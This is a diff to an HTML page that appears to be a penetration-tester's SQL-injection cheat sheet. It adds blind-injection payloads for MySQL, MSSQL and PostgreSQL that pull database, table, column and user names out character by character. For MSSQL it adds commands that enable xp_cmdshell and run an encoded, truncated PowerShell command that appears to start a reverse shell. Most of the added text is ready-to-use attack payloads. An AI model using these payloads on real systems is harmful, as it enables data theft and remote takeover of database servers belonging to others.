@@ -304,11 +304,45 @@ cn' UNION SELECT 1,variable_name,variable_value,5 FROM information_schema.global
                     </ul>    
                     <h3> Blind SQL injection </h3>
                     <ul>
-                    <p>Rememer to intercept the requests since in this case the injection has been made in the cookie. In this case it has been detected that if the query was valid a string was displayed on the screen. To check if a table exists we can use the following command</p>
-                    <pre><code class="language-sql">' AND (SELECT 'a' FROM users LIMIT 1)='a</code></pre>
-                    We used the following query to check letter by letter the password
-                    <pre><code class="language-sql">' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a</code></pre>
+                        <p>In this kind of injections, the results of the query are not directly displayed on the screen. Instead, we need to infer the information based on the behavior of the application.</p>
+                        <p>Here are some examples to acquire the data letter by letter. In case of error means the letter is incorrect.</p>
+                        <div class="button" onclick="toggleDiv()">MySQL</div>
+                            <div id="foldedDiv" class="content">
+                                <pre><code class="language-sql">' AND SUBSTRING(database(),1,1)='a   #Identify the first letter for the current database</code></pre>
+                                <pre><code class="language-sql">' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0),1,1)='a         #Identify the first letter for the first table, in case you would like to enumerate the second table just increment the OFFSET value</code></pre>
+                                <pre><code class="language-sql">' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' ORDER BY column_name LIMIT 1 OFFSET 0),1,1)='a   #Now that you have identifyed the table name we must identify  the headers of the table. Increment the OFFSET to change the table and increment the last number to test the second letter of the header</code></pre>
+                                <pre><code class="language-sql">' AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a  #Finally list the values of the users talbe</code></pre>
+                            </div>
+                        <br>    
+                        <div class="button" onclick="toggleDiv()">MSSQL</div>    
+                            <div id="foldedDiv" class="content">
+                                <pre><code class="language-sql">' AND SUBSTRING(DB_NAME(),1,1)='a   #Identify the first letter for the current database</code></pre>
+                                <pre><code class="language-sql">' AND SUBSTRING((SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN (SELECT TOP 0 table_name FROM information_schema.tables) ORDER BY table_name),1,1)='a         #Identify the first letter for the first table, in case you would like to enumerate the second table adjust the TOP/NOT IN subquery to skip already-known tables</code></pre>
+                                <pre><code class="language-sql">' AND SUBSTRING((SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users' ORDER BY column_name),1,1)='a   #Now that you have identifyed the table name we must identify the headers of the table. Adjust the TOP/ORDER BY subquery to change the table and increment the last number to test the second letter of the header</code></pre>
+                                <pre><code class="language-sql">' AND SUBSTRING((SELECT TOP 1 username FROM users),1,1)='a  #Finally list the values of the users table</code></pre>
+                            </div>
+                        <br>
+                        <div class="button" onclick="toggleDiv()">PostgreSQL</div>        
+                            <div id="foldedDiv" class="content">
+                                <pre><code class="language-sql">' AND SUBSTRING(current_database(),1,1)='a   #Identify the first letter for the current database</code></pre>
+                                <pre><code class="language-sql">' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' ORDER BY table_name LIMIT 1 OFFSET 0),1,1)='a         #Identify the first letter for the first table, in case you would like to enumerate the second table just increment the OFFSET value</code></pre>
+                                <pre><code class="language-sql">' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='public' AND table_name='users' ORDER BY column_name LIMIT 1 OFFSET 0),1,1)='a   #Now that you have identifyed the table name we must identify  the headers of the table. Increment the OFFSET to change the table and increment the last number to test the second letter of the header</code></pre>
+                                <pre><code class="language-sql">' AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a  #Finally list the values of the users talbe</code></pre>
+                            </div>
                         
+                        <h4>Boolean based blind injection</h4>
+                        <ul>
+                            <p>In this injection we are only able to know if the query is true or false</p>
+                            <p>For example if we dont recieve an error in our query means that query was executed so it valid</p>
+                            <div class="button" onclick="toggleDiv()">MSSQL</div>
+                            <div id="foldedDiv" class="content">
+                                <p>In case you are infront of a MSSQL database (know it based on the operaing system of the target) you should try to perform a command execution on the system by enabling the following modules</p>
+                                <pre><code class="language-sql">' EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --</code></pre>
+                                <pre><code class="language-sql">' EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AY...' ; --</code></pre>
+                            </div>
+                        </ul>
+                        <p></p>
+
                         <h4>Time-Basd blind injection</h4>
                         <ul>
                             <p>Here are some payloads to try</p>
